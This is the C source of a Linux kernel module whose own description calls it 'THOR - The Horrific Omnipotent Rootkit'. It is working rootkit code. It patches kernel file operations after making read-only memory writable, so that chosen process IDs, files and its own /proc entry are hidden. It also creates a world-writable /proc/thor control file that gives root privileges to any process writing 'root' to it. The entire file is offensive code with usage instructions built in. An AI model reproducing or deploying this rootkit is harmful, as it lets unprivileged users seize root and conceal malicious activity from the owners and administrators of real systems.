#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/ptrace.h>
#include <linux/slab.h>

#include <fs/proc/internal.h>

#include "logging.h"

#define THOR_PROCFILE "thor"

#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })

// ------------------------------------------------------------ PROTOTYPES
static int __init thor_init(void);
static int __init procfile_init(void);
static int __init prochidder_init(void);
static int __init filehidder_init(void);
static void prochidder_cleanup(void);
static void filehidder_cleanup(void);
static void __exit thor_exit(void);
static void thor_cleanup(void);
static int procfile_open(struct inode *inode, struct file *file);
static int procfile_read(struct seq_file *m, void *v);
static ssize_t procfile_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
static void procfile_cleanup(void);
static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static int thor_fs_iterate(struct file *file, struct dir_context *ctx);
static int thor_fs_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static void add_to_pid_list(const char *name, unsigned int len);
static void remove_from_pid_list(const char *name, unsigned int len);
static void clear_pid_list(void);
static void add_to_file_list(const char *name, unsigned int len);
static void remove_from_file_list(const char *name, unsigned int len);
static void clear_file_list(void);
// ------------------------------------------------------------ DEFINITIONS
struct _pid_list {
    char *name;
    struct list_head list;
};
struct _file_list {
    char *name;
    struct list_head list;
};
// ------------------------------------------------------------ GLOBALS
static struct proc_dir_entry *procfile;
static struct proc_dir_entry *procroot;
static struct file_operations *proc_fops;
static struct file_operations *fs_fops;
static int (*orig_proc_iterate)(struct file *, struct dir_context *);
static int (*orig_proc_filldir)(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static int (*orig_fs_iterate)(struct file *, struct dir_context *);
static int (*orig_fs_filldir)(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static struct file_operations procfile_fops = {
    .owner = THIS_MODULE,
    .open = procfile_open,
    .read = seq_read,
    .write = procfile_write,
    .llseek = seq_lseek,
    .release = single_release,
};
struct _pid_list pid_list;
struct _file_list file_list;
// ------------------------------------------------------------ HELPERS
static void set_addr_rw(void *addr)
{
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) addr, &level);
    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
}

// ------------------------------------------------------------ INIT
static int __init thor_init(void)
{
    if(procfile_init() < 0 || prochidder_init() < 0 || filehidder_init() < 0)
    {
        LOG_ERROR("failed to initialize");
        thor_cleanup();
        return -1;
    }

    LOG_INFO("init done");
    return 0;
}

static int __init procfile_init(void)
{
    // allocate file in proc
    procfile = proc_create(THOR_PROCFILE, 0666, NULL, &procfile_fops);
    if (procfile == NULL) {
        LOG_ERROR("could not create proc entry");
        return -1;
    }

    return 0;
}

static int __init prochidder_init(void)
{
    // insert our modified iterate for /proc
    procroot = procfile->parent;
    proc_fops = (struct file_operations*)procroot->proc_fops;
    orig_proc_iterate = proc_fops->iterate;

    set_addr_rw(proc_fops);
    proc_fops->iterate = thor_proc_iterate;
    set_addr_ro(proc_fops);

    INIT_LIST_HEAD(&pid_list.list);

    return 0;
}

static int __init filehidder_init(void)
{
    struct file *filep_etc;

    filep_etc = filp_open("/etc", O_RDONLY, 0);
    if(filep_etc == NULL)
    {
        LOG_ERROR("could not open /etc");
        return -1;
    }

    fs_fops = (struct file_operations*) filep_etc->f_op;
    filp_close(filep_etc, NULL);

    orig_fs_iterate = fs_fops->iterate;
    set_addr_rw(fs_fops);
    fs_fops->iterate = thor_fs_iterate;
    set_addr_ro(fs_fops);

    INIT_LIST_HEAD(&file_list.list);

    return 0;
}

// ------------------------------------------------------------ PROCFILE
static int procfile_read(struct seq_file *m, void *v)
{
    seq_printf(m, 
        "usage:\n"\
        "   echo hpPID > /proc/" THOR_PROCFILE " (hides process PID)\n"\
        "   echo upPID > /proc/" THOR_PROCFILE " (unhides process PID)\n"\
        "   echo upa > /proc/" THOR_PROCFILE " (unhide all PIDs)\n"\
        "   echo root > /proc/" THOR_PROCFILE " (gain root privileges)\n");
    return 0;
}

static int procfile_open(struct inode *inode, struct file *file)
{
    return single_open(file, procfile_read, NULL);
}

static ssize_t procfile_write(struct file *file, const char __user *buffer,
        size_t count, loff_t *ppos)
{
    if(0 == strncmp(buffer, "hp", MIN(2, count)))
    {
        add_to_pid_list(buffer+2, count-2);
    }
    else if(0 == strncmp(buffer, "upa", MIN(3, count)))
    {
        clear_pid_list();
    }
    else if(0 == strncmp(buffer, "up", MIN(2, count)))
    {
        remove_from_pid_list(buffer+2, count-2);
    }
    else if(0 == strncmp(buffer, "hf", MIN(2, count)))
    {
        add_to_file_list(buffer+2, count-2);
    }
    else if(0 == strncmp(buffer, "ufa", MIN(3, count)))
    {
        clear_file_list();
    }
    else if(0 == strncmp(buffer, "uf", MIN(2, count)))
    {
        remove_from_file_list(buffer+2, count-2);
    }
    else if(0 == strncmp(buffer, "root", MIN(4, count)))
    {
        struct cred *credentials = prepare_creds();
        credentials->uid = credentials->euid = GLOBAL_ROOT_UID;
        credentials->gid = credentials->egid = GLOBAL_ROOT_GID;
        commit_creds(credentials);
    }
    return count;
}

// ------------------------------------------------------------ PROCROOT
static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
{
    int ret;
    filldir_t *ctx_actor;
    // capture original filldir function
    orig_proc_filldir = ctx->actor;
    // cast away const from ctx->actor
    ctx_actor = (filldir_t*)(&ctx->actor);
    // store our filldir in ctx->actor
    *ctx_actor = thor_proc_filldir;
    ret = orig_proc_iterate(file, ctx);
    // restore original filldir
    *ctx_actor = orig_proc_filldir;
    return ret;
}

static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    struct _pid_list *tmp;
    // hide specified PIDs
    list_for_each_entry(tmp, &(pid_list.list), list)
    {
        if(0 == strcmp(name, tmp->name)) return 0;
    }
    // hide thor itself
    if (0 == strcmp(name, THOR_PROCFILE)) return 0;
    return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
}

// ------------------------------------------------------------ FILEHIDE
static int thor_fs_iterate(struct file *file, struct dir_context *ctx)
{
    int ret;
    filldir_t *ctx_actor;
    // capture original filldir function
    orig_fs_filldir = ctx->actor;
    // cast away const from ctx->actor
    ctx_actor = (filldir_t*)(&ctx->actor);
    // store our filldir in ctx->actor
    *ctx_actor = thor_fs_filldir;
    ret = orig_fs_iterate(file, ctx);
    // restore original filldir
    *ctx_actor = orig_fs_filldir;
    return ret;
}

static int thor_fs_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    struct _file_list *tmp;
    // hide specified files
    list_for_each_entry(tmp, &(file_list.list), list)
    {
        if(0 == strcmp(name, tmp->name)) return 0;
    }
    return orig_fs_filldir(buf, name, namelen, offset, ino, d_type);
}
// ------------------------------------------------------------ FILELIST
static void add_to_file_list(const char *name, unsigned int len)
{
    struct _file_list *tmp;

    tmp = (struct _file_list*)kmalloc(sizeof(struct _file_list), GFP_KERNEL);
    tmp->name = (char*)kmalloc(len, GFP_KERNEL);
    memcpy(tmp->name, name, len);
    tmp->name[len-1] = 0;

    list_add(&(tmp->list), &(file_list.list));
}

static void remove_from_file_list(const char *name, unsigned int len)
{
    struct _file_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(file_list.list))
    {
        tmp = list_entry(pos, struct _file_list, list);
        if(0 == strncmp(tmp->name, name, len-1))
        {
            list_del(pos);
            kfree(tmp->name);
            kfree(tmp);
        }
    }
}

static void clear_file_list(void)
{
    struct _file_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(file_list.list))
    {
        tmp = list_entry(pos, struct _file_list, list);
        list_del(pos);
        kfree(tmp->name);
        kfree(tmp);
    }
}

// ------------------------------------------------------------ PIDLIST
static void add_to_pid_list(const char *name, unsigned int len)
{
    struct _pid_list *tmp;

    tmp = (struct _pid_list*)kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
    tmp->name = (char*)kmalloc(len, GFP_KERNEL);
    memcpy(tmp->name, name, len);
    tmp->name[len-1] = 0;

    list_add(&(tmp->list), &(pid_list.list));
}

static void remove_from_pid_list(const char *name, unsigned int len)
{
    struct _pid_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(pid_list.list))
    {
        tmp = list_entry(pos, struct _pid_list, list);
        if(0 == strncmp(tmp->name, name, len-1))
        {
            list_del(pos);
            kfree(tmp->name);
            kfree(tmp);
        }
    }
}

static void clear_pid_list(void)
{
    struct _pid_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(pid_list.list))
    {
        tmp = list_entry(pos, struct _pid_list, list);
        list_del(pos);
        kfree(tmp->name);
        kfree(tmp);
    }
}
// ------------------------------------------------------------ CLEANUP
static void thor_cleanup(void)
{
    procfile_cleanup();
    prochidder_cleanup();
    filehidder_cleanup();

    LOG_INFO("cleanup done");
}

static void procfile_cleanup(void)
{
    if (procfile != NULL) {
        proc_remove(procfile);
        procfile = NULL;
    }
}

static void prochidder_cleanup(void)
{
    if(NULL != proc_fops && NULL != orig_proc_iterate)
    {
        set_addr_rw(proc_fops);
        proc_fops->iterate = orig_proc_iterate;
        set_addr_ro(proc_fops);
    }

    clear_pid_list();
}

static void filehidder_cleanup(void)
{
    if(NULL != fs_fops && NULL != orig_fs_iterate)
    {
        set_addr_rw(fs_fops);
        fs_fops->iterate = orig_fs_iterate;
        set_addr_ro(fs_fops);
    }

    clear_file_list();
}

static void __exit thor_exit(void)
{
    thor_cleanup();
}

module_init(thor_init);
module_exit(thor_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alex Hirsch (W4RH4WK) <alexander.hirsch@student.uibk.ac.at>");
MODULE_AUTHOR("Franz-Josef Anton Friedrich Haider (krnylng) <Franz-Josef.Haider@student.uibk.ac.at>");
MODULE_DESCRIPTION("THOR - The Horrific Omnipotent Rootkit");
